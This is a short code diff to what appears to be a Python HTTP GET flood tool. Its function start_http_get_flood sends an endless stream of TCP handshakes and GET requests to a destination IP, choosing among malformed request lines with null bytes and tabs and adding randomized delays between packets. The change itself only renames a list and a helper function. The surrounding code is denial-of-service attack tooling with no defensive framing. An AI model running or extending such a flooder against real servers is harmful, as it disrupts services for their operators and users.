@@ -4,7 +4,7 @@ from sys import path
 path.append("..")
 import packet_builder
 
-request_line = [
+request_lines = [
     'GET%00 / HTTP/1.1\r\n',
     'GET\0 / HTTP/1.1\r\n',
     'GET\t/\tHTTP/1.1\r\n',
@@ -44,6 +44,6 @@ def start_http_get_flood(destination_ip):
     """Continuously send HTTP GET requests"""
     try:
         while True:
-            send(make_tcp_handshake(destination_ip, choice(request_line)), inter=packet_builder.generate_delay_for_packet())
+            send(make_tcp_handshake(destination_ip, choice(request_lines)), inter=packet_builder.generate_delay())
     except KeyboardInterrupt:
         print("...Exiting...")
